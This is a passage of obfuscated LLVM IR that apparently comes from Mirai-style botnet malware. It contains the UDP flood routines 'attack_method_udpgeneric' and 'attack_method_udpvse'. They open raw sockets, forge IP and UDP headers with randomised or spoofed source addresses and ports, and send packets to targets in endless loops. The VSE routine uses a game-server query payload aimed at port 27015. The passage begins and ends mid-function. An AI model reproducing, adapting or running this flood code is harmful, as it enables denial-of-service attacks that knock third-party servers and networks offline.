  store %struct.sockaddr* %891, %struct.sockaddr** %885, align 8
  %892 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %893 = load %struct.sockaddr*, %struct.sockaddr** %892, align 8
  %894 = call i64 @sendto(i32 %877, i8* %878, i64 %883, i32 16384, %struct.sockaddr* %893, i32 16)
  br label %895

; <label>:895:                                    ; preds = %810
  %896 = load i32, i32* %9, align 4
  %897 = add i32 %896, 855827285
  %898 = add i32 %897, 1
  %899 = sub i32 %898, 855827285
  %900 = add nsw i32 %896, 1
  store i32 %899, i32* %9, align 4
  br label %773

; <label>:901:                                    ; preds = %773
  br label %772

; <label>:902:                                    ; preds = %227, %111, %105
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpgeneric(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i16, align 2
  %19 = alloca i8, align 1
  %20 = alloca i32, align 4
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.udphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %28 = load i8, i8* %5, align 1
  %29 = zext i8 %28 to i64
  %30 = call noalias i8* @calloc(i64 %29, i64 8) #6
  %31 = bitcast i8* %30 to i8**
  store i8** %31, i8*** %11, align 8
  %32 = load i8, i8* %7, align 1
  %33 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %34 = call i32 @attack_get_opt_int(i8 zeroext %32, %struct.attack_option* %33, i8 zeroext 2, i32 0)
  %35 = trunc i32 %34 to i8
  store i8 %35, i8* %12, align 1
  %36 = load i8, i8* %7, align 1
  %37 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %38 = call i32 @attack_get_opt_int(i8 zeroext %36, %struct.attack_option* %37, i8 zeroext 3, i32 65535)
  %39 = trunc i32 %38 to i16
  store i16 %39, i16* %13, align 2
  %40 = load i8, i8* %7, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 4, i32 64)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %14, align 1
  %44 = load i8, i8* %7, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 5, i32 0)
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %15, align 1
  %48 = load i8, i8* %7, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 6, i32 65535)
  %51 = trunc i32 %50 to i16
  store i16 %51, i16* %16, align 2
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 7, i32 65535)
  %55 = trunc i32 %54 to i16
  store i16 %55, i16* %17, align 2
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 0, i32 512)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %18, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 1, i32 1)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %19, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = load i32, i32* @LOCAL_ADDR, align 4
  %67 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 25, i32 %66)
  store i32 %67, i32* %20, align 4
  %68 = load i16, i16* %18, align 2
  %69 = zext i16 %68 to i32
  %70 = icmp sgt i32 %69, 1460
  br i1 %70, label %71, label %72

; <label>:71:                                     ; preds = %4
  store i16 1460, i16* %18, align 2
  br label %72

; <label>:72:                                     ; preds = %71, %4
  %73 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %73, i32* %10, align 4
  %74 = icmp eq i32 %73, -1
  br i1 %74, label %75, label %76

; <label>:75:                                     ; preds = %72
  br label %372

; <label>:76:                                     ; preds = %72
  store i32 1, i32* %9, align 4
  %77 = load i32, i32* %10, align 4
  %78 = bitcast i32* %9 to i8*
  %79 = call i32 @setsockopt(i32 %77, i32 0, i32 3, i8* %78, i32 4) #6
  %80 = icmp eq i32 %79, -1
  br i1 %80, label %81, label %84

; <label>:81:                                     ; preds = %76
  %82 = load i32, i32* %10, align 4
  %83 = call i32 @close(i32 %82)
  br label %372

; <label>:84:                                     ; preds = %76
  store i32 0, i32* %9, align 4
  br label %85

; <label>:85:                                     ; preds = %211, %84
  %86 = load i32, i32* %9, align 4
  %87 = load i8, i8* %5, align 1
  %88 = zext i8 %87 to i32
  %89 = icmp slt i32 %86, %88
  br i1 %89, label %90, label %217

; <label>:90:                                     ; preds = %85
  %91 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %92 = load i8**, i8*** %11, align 8
  %93 = load i32, i32* %9, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i8*, i8** %92, i64 %94
  store i8* %91, i8** %95, align 8
  %96 = load i8**, i8*** %11, align 8
  %97 = load i32, i32* %9, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds i8*, i8** %96, i64 %98
  %100 = load i8*, i8** %99, align 8
  %101 = bitcast i8* %100 to %struct.iphdr*
  store %struct.iphdr* %101, %struct.iphdr** %21, align 8
  %102 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %103 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %102, i64 1
  %104 = bitcast %struct.iphdr* %103 to %struct.udphdr*
  store %struct.udphdr* %104, %struct.udphdr** %22, align 8
  %105 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %106 = bitcast %struct.iphdr* %105 to i8*
  %107 = load i8, i8* %106, align 4
  %108 = xor i8 %107, -1
  %109 = xor i8 15, -1
  %110 = xor i8 2, -1
  %111 = or i8 %108, %109
  %112 = or i8 2, %110
  %113 = xor i8 %111, -1
  %114 = and i8 %113, %112
  %115 = and i8 %107, 15
  %116 = xor i8 %114, -1
  %117 = xor i8 64, -1
  %118 = xor i8 -32, -1
  %119 = and i8 %116, -32
  %120 = and i8 %114, %118
  %121 = and i8 %117, -32
  %122 = and i8 64, %118
  %123 = or i8 %119, %120
  %124 = or i8 %121, %122
  %125 = xor i8 %123, %124
  %126 = or i8 %116, %117
  %127 = xor i8 %126, -1
  %128 = or i8 -32, %118
  %129 = and i8 %127, %128
  %130 = or i8 %125, %129
  %131 = or i8 %114, 64
  store i8 %130, i8* %106, align 4
  %132 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %133 = bitcast %struct.iphdr* %132 to i8*
  %134 = load i8, i8* %133, align 4
  %135 = xor i8 -16, -1
  %136 = xor i8 %134, %135
  %137 = and i8 %136, %134
  %138 = and i8 %134, -16
  %139 = xor i8 %137, -1
  %140 = xor i8 5, -1
  %141 = xor i8 80, -1
  %142 = and i8 %139, 80
  %143 = and i8 %137, %141
  %144 = and i8 %140, 80
  %145 = and i8 5, %141
  %146 = or i8 %142, %143
  %147 = or i8 %144, %145
  %148 = xor i8 %146, %147
  %149 = or i8 %139, %140
  %150 = xor i8 %149, -1
  %151 = or i8 80, %141
  %152 = and i8 %150, %151
  %153 = or i8 %148, %152
  %154 = or i8 %137, 5
  store i8 %153, i8* %133, align 4
  %155 = load i8, i8* %12, align 1
  %156 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %157 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %156, i32 0, i32 1
  store i8 %155, i8* %157, align 1
  %158 = load i16, i16* %18, align 2
  %159 = zext i16 %158 to i64
  %160 = sub i64 0, %159
  %161 = sub i64 28, %160
  %162 = add i64 28, %159
  %163 = trunc i64 %161 to i16
  %164 = call zeroext i16 @htons(i16 zeroext %163) #7
  %165 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %166 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %165, i32 0, i32 2
  store i16 %164, i16* %166, align 2
  %167 = load i16, i16* %13, align 2
  %168 = call zeroext i16 @htons(i16 zeroext %167) #7
  %169 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i32 0, i32 3
  store i16 %168, i16* %170, align 4
  %171 = load i8, i8* %14, align 1
  %172 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %173 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %172, i32 0, i32 5
  store i8 %171, i8* %173, align 4
  %174 = load i8, i8* %15, align 1
  %175 = icmp ne i8 %174, 0
  br i1 %175, label %176, label %180

; <label>:176:                                    ; preds = %90
  %177 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %178 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %179 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %178, i32 0, i32 4
  store i16 %177, i16* %179, align 2
  br label %180

; <label>:180:                                    ; preds = %176, %90
  %181 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %182 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %181, i32 0, i32 6
  store i8 17, i8* %182, align 1
  %183 = load i32, i32* %20, align 4
  %184 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %185 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %184, i32 0, i32 8
  store i32 %183, i32* %185, align 4
  %186 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %187 = load i32, i32* %9, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %186, i64 %188
  %190 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %189, i32 0, i32 1
  %191 = load i32, i32* %190, align 4
  %192 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %193 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %192, i32 0, i32 9
  store i32 %191, i32* %193, align 4
  %194 = load i16, i16* %16, align 2
  %195 = call zeroext i16 @htons(i16 zeroext %194) #7
  %196 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %197 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %196, i32 0, i32 0
  store i16 %195, i16* %197, align 2
  %198 = load i16, i16* %17, align 2
  %199 = call zeroext i16 @htons(i16 zeroext %198) #7
  %200 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %201 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %200, i32 0, i32 1
  store i16 %199, i16* %201, align 2
  %202 = load i16, i16* %18, align 2
  %203 = zext i16 %202 to i64
  %204 = sub i64 0, %203
  %205 = sub i64 8, %204
  %206 = add i64 8, %203
  %207 = trunc i64 %205 to i16
  %208 = call zeroext i16 @htons(i16 zeroext %207) #7
  %209 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %210 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %209, i32 0, i32 2
  store i16 %208, i16* %210, align 2
  br label %211

; <label>:211:                                    ; preds = %180
  %212 = load i32, i32* %9, align 4
  %213 = add i32 %212, -524598905
  %214 = add i32 %213, 1
  %215 = sub i32 %214, -524598905
  %216 = add nsw i32 %212, 1
  store i32 %215, i32* %9, align 4
  br label %85

; <label>:217:                                    ; preds = %85
  br label %218

; <label>:218:                                    ; preds = %371, %217
  store i32 0, i32* %9, align 4
  br label %219

; <label>:219:                                    ; preds = %366, %218
  %220 = load i32, i32* %9, align 4
  %221 = load i8, i8* %5, align 1
  %222 = zext i8 %221 to i32
  %223 = icmp slt i32 %220, %222
  br i1 %223, label %224, label %371

; <label>:224:                                    ; preds = %219
  %225 = load i8**, i8*** %11, align 8
  %226 = load i32, i32* %9, align 4
  %227 = sext i32 %226 to i64
  %228 = getelementptr inbounds i8*, i8** %225, i64 %227
  %229 = load i8*, i8** %228, align 8
  store i8* %229, i8** %23, align 8
  %230 = load i8*, i8** %23, align 8
  %231 = bitcast i8* %230 to %struct.iphdr*
  store %struct.iphdr* %231, %struct.iphdr** %24, align 8
  %232 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %233 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %232, i64 1
  %234 = bitcast %struct.iphdr* %233 to %struct.udphdr*
  store %struct.udphdr* %234, %struct.udphdr** %25, align 8
  %235 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %236 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %235, i64 1
  %237 = bitcast %struct.udphdr* %236 to i8*
  store i8* %237, i8** %26, align 8
  %238 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %239 = load i32, i32* %9, align 4
  %240 = sext i32 %239 to i64
  %241 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %238, i64 %240
  %242 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %241, i32 0, i32 2
  %243 = load i8, i8* %242, align 4
  %244 = zext i8 %243 to i32
  %245 = icmp slt i32 %244, 32
  br i1 %245, label %246, label %270

; <label>:246:                                    ; preds = %224
  %247 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %248 = load i32, i32* %9, align 4
  %249 = sext i32 %248 to i64
  %250 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %247, i64 %249
  %251 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %250, i32 0, i32 1
  %252 = load i32, i32* %251, align 4
  %253 = call i32 @ntohl(i32 %252) #7
  %254 = call i32 @rand_next()
  %255 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %256 = load i32, i32* %9, align 4
  %257 = sext i32 %256 to i64
  %258 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %255, i64 %257
  %259 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %258, i32 0, i32 2
  %260 = load i8, i8* %259, align 4
  %261 = zext i8 %260 to i32
  %262 = lshr i32 %254, %261
  %263 = add i32 %253, 2048896621
  %264 = add i32 %263, %262
  %265 = sub i32 %264, 2048896621
  %266 = add i32 %253, %262
  %267 = call i32 @htonl(i32 %265) #7
  %268 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %269 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %268, i32 0, i32 9
  store i32 %267, i32* %269, align 4
  br label %270

; <label>:270:                                    ; preds = %246, %224
  %271 = load i32, i32* %20, align 4
  %272 = icmp eq i32 %271, -1
  br i1 %272, label %273, label %277

; <label>:273:                                    ; preds = %270
  %274 = call i32 @rand_next()
  %275 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %276 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %275, i32 0, i32 8
  store i32 %274, i32* %276, align 4
  br label %277

; <label>:277:                                    ; preds = %273, %270
  %278 = load i16, i16* %13, align 2
  %279 = zext i16 %278 to i32
  %280 = icmp eq i32 %279, 65535
  br i1 %280, label %281, label %286

; <label>:281:                                    ; preds = %277
  %282 = call i32 @rand_next()
  %283 = trunc i32 %282 to i16
  %284 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %285 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %284, i32 0, i32 3
  store i16 %283, i16* %285, align 4
  br label %286

; <label>:286:                                    ; preds = %281, %277
  %287 = load i16, i16* %16, align 2
  %288 = zext i16 %287 to i32
  %289 = icmp eq i32 %288, 65535
  br i1 %289, label %290, label %295

; <label>:290:                                    ; preds = %286
  %291 = call i32 @rand_next()
  %292 = trunc i32 %291 to i16
  %293 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %294 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %293, i32 0, i32 0
  store i16 %292, i16* %294, align 2
  br label %295

; <label>:295:                                    ; preds = %290, %286
  %296 = load i16, i16* %17, align 2
  %297 = zext i16 %296 to i32
  %298 = icmp eq i32 %297, 65535
  br i1 %298, label %299, label %304

; <label>:299:                                    ; preds = %295
  %300 = call i32 @rand_next()
  %301 = trunc i32 %300 to i16
  %302 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %303 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %302, i32 0, i32 1
  store i16 %301, i16* %303, align 2
  br label %304

; <label>:304:                                    ; preds = %299, %295
  %305 = load i8, i8* %19, align 1
  %306 = icmp ne i8 %305, 0
  br i1 %306, label %307, label %311

; <label>:307:                                    ; preds = %304
  %308 = load i8*, i8** %26, align 8
  %309 = load i16, i16* %18, align 2
  %310 = zext i16 %309 to i32
  call void @rand_str(i8* %308, i32 %310)
  br label %311

; <label>:311:                                    ; preds = %307, %304
  %312 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %313 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %312, i32 0, i32 7
  store i16 0, i16* %313, align 2
  %314 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %315 = bitcast %struct.iphdr* %314 to i16*
  %316 = call zeroext i16 @checksum_generic(i16* %315, i32 20)
  %317 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %318 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %317, i32 0, i32 7
  store i16 %316, i16* %318, align 2
  %319 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %320 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %319, i32 0, i32 3
  store i16 0, i16* %320, align 2
  %321 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %322 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %323 = bitcast %struct.udphdr* %322 to i8*
  %324 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %325 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %324, i32 0, i32 2
  %326 = load i16, i16* %325, align 2
  %327 = load i16, i16* %18, align 2
  %328 = zext i16 %327 to i64
  %329 = sub i64 0, 8
  %330 = sub i64 0, %328
  %331 = add i64 %329, %330
  %332 = sub i64 0, %331
  %333 = add i64 8, %328
  %334 = trunc i64 %332 to i32
  %335 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %321, i8* %323, i16 zeroext %326, i32 %334)
  %336 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %337 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %336, i32 0, i32 3
  store i16 %335, i16* %337, align 2
  %338 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %339 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %338, i32 0, i32 1
  %340 = load i16, i16* %339, align 2
  %341 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %342 = load i32, i32* %9, align 4
  %343 = sext i32 %342 to i64
  %344 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %341, i64 %343
  %345 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %344, i32 0, i32 0
  %346 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %345, i32 0, i32 1
  store i16 %340, i16* %346, align 2
  %347 = load i32, i32* %10, align 4
  %348 = load i8*, i8** %23, align 8
  %349 = load i16, i16* %18, align 2
  %350 = zext i16 %349 to i64
  %351 = sub i64 0, 28
  %352 = sub i64 0, %350
  %353 = add i64 %351, %352
  %354 = sub i64 0, %353
  %355 = add i64 28, %350
  %356 = bitcast %union.__CONST_SOCKADDR_ARG* %27 to %struct.sockaddr**
  %357 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %358 = load i32, i32* %9, align 4
  %359 = sext i32 %358 to i64
  %360 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %357, i64 %359
  %361 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %360, i32 0, i32 0
  %362 = bitcast %struct.sockaddr_in* %361 to %struct.sockaddr*
  store %struct.sockaddr* %362, %struct.sockaddr** %356, align 8
  %363 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %27, i32 0, i32 0
  %364 = load %struct.sockaddr*, %struct.sockaddr** %363, align 8
  %365 = call i64 @sendto(i32 %347, i8* %348, i64 %354, i32 16384, %struct.sockaddr* %364, i32 16)
  br label %366

; <label>:366:                                    ; preds = %311
  %367 = load i32, i32* %9, align 4
  %368 = sub i32 0, 1
  %369 = sub i32 %367, %368
  %370 = add nsw i32 %367, 1
  store i32 %369, i32* %9, align 4
  br label %219

; <label>:371:                                    ; preds = %219
  br label %218

; <label>:372:                                    ; preds = %81, %75
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpvse(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i8*, align 8
  %19 = alloca i32, align 4
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 8) #6
  %30 = bitcast i8* %29 to i8**
  store i8** %30, i8*** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 2, i32 0)
  %34 = trunc i32 %33 to i8
  store i8 %34, i8* %12, align 1
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 3, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 4, i32 64)
  %42 = trunc i32 %41 to i8
  store i8 %42, i8* %14, align 1
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 5, i32 0)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = load i8, i8* %7, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %49 = call i32 @attack_get_opt_int(i8 zeroext %47, %struct.attack_option* %48, i8 zeroext 6, i32 65535)
  %50 = trunc i32 %49 to i16
  store i16 %50, i16* %16, align 2
  %51 = load i8, i8* %7, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 7, i32 27015)
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %17, align 2
  call void @table_unlock_val(i8 zeroext 20)
  %55 = call i8* @table_retrieve_val(i32 20, i32* %19)
  store i8* %55, i8** %18, align 8
  %56 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %56, i32* %10, align 4
  %57 = icmp eq i32 %56, -1
  br i1 %57, label %58, label %59

; <label>:58:                                     ; preds = %4
  br label %349

; <label>:59:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %60 = load i32, i32* %10, align 4
  %61 = bitcast i32* %9 to i8*
  %62 = call i32 @setsockopt(i32 %60, i32 0, i32 3, i8* %61, i32 4) #6
  %63 = icmp eq i32 %62, -1
  br i1 %63, label %64, label %67

; <label>:64:                                     ; preds = %59
  %65 = load i32, i32* %10, align 4
  %66 = call i32 @close(i32 %65)
  br label %349

; <label>:67:                                     ; preds = %59
  store i32 0, i32* %9, align 4
  br label %68

; <label>:68:                                     ; preds = %206, %67
  %69 = load i32, i32* %9, align 4
  %70 = load i8, i8* %5, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp slt i32 %69, %71
  br i1 %72, label %73, label %212

; <label>:73:                                     ; preds = %68
  %74 = call noalias i8* @calloc(i64 128, i64 1) #6
  %75 = load i8**, i8*** %11, align 8
  %76 = load i32, i32* %9, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8*, i8** %75, i64 %77
  store i8* %74, i8** %78, align 8
  %79 = load i8**, i8*** %11, align 8
  %80 = load i32, i32* %9, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds i8*, i8** %79, i64 %81
  %83 = load i8*, i8** %82, align 8
  %84 = bitcast i8* %83 to %struct.iphdr*
  store %struct.iphdr* %84, %struct.iphdr** %20, align 8
  %85 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %86 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %85, i64 1
  %87 = bitcast %struct.iphdr* %86 to %struct.udphdr*
  store %struct.udphdr* %87, %struct.udphdr** %21, align 8
  %88 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %89 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %88, i64 1
  %90 = bitcast %struct.udphdr* %89 to i8*
  store i8* %90, i8** %22, align 8
  %91 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %92 = bitcast %struct.iphdr* %91 to i8*
  %93 = load i8, i8* %92, align 4
  %94 = xor i8 %93, -1
  %95 = xor i8 15, -1
  %96 = xor i8 -36, -1
  %97 = or i8 %94, %95
  %98 = or i8 -36, %96
  %99 = xor i8 %97, -1
  %100 = and i8 %99, %98
  %101 = and i8 %93, 15
  %102 = xor i8 %100, -1
  %103 = xor i8 64, -1
  %104 = xor i8 18, -1
  %105 = and i8 %102, 18
  %106 = and i8 %100, %104
  %107 = and i8 %103, 18
  %108 = and i8 64, %104
  %109 = or i8 %105, %106
  %110 = or i8 %107, %108
  %111 = xor i8 %109, %110
  %112 = or i8 %102, %103
  %113 = xor i8 %112, -1
  %114 = or i8 18, %104
  %115 = and i8 %113, %114
  %116 = or i8 %111, %115
  %117 = or i8 %100, 64
  store i8 %116, i8* %92, align 4
  %118 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %119 = bitcast %struct.iphdr* %118 to i8*
  %120 = load i8, i8* %119, align 4
  %121 = xor i8 -16, -1
  %122 = xor i8 %120, %121
  %123 = and i8 %122, %120
  %124 = and i8 %120, -16
  %125 = xor i8 %123, -1
  %126 = xor i8 5, -1
  %127 = xor i8 -30, -1
  %128 = and i8 %125, -30
  %129 = and i8 %123, %127
  %130 = and i8 %126, -30
  %131 = and i8 5, %127
  %132 = or i8 %128, %129
  %133 = or i8 %130, %131
  %134 = xor i8 %132, %133
  %135 = or i8 %125, %126
  %136 = xor i8 %135, -1
  %137 = or i8 -30, %127
  %138 = and i8 %136, %137
  %139 = or i8 %134, %138
  %140 = or i8 %123, 5
  store i8 %139, i8* %119, align 4
  %141 = load i8, i8* %12, align 1
  %142 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %143 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %142, i32 0, i32 1
  store i8 %141, i8* %143, align 1
  %144 = load i32, i32* %19, align 4
  %145 = sext i32 %144 to i64
  %146 = add i64 32, 3359741681100249282
  %147 = add i64 %146, %145
  %148 = sub i64 %147, 3359741681100249282
  %149 = add i64 32, %145
  %150 = trunc i64 %148 to i16
  %151 = call zeroext i16 @htons(i16 zeroext %150) #7
  %152 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 2
  store i16 %151, i16* %153, align 2
  %154 = load i16, i16* %13, align 2
  %155 = call zeroext i16 @htons(i16 zeroext %154) #7
  %156 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %157 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %156, i32 0, i32 3
  store i16 %155, i16* %157, align 4
  %158 = load i8, i8* %14, align 1
  %159 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %160 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i32 0, i32 5
  store i8 %158, i8* %160, align 4
  %161 = load i8, i8* %15, align 1
  %162 = icmp ne i8 %161, 0
  br i1 %162, label %163, label %167

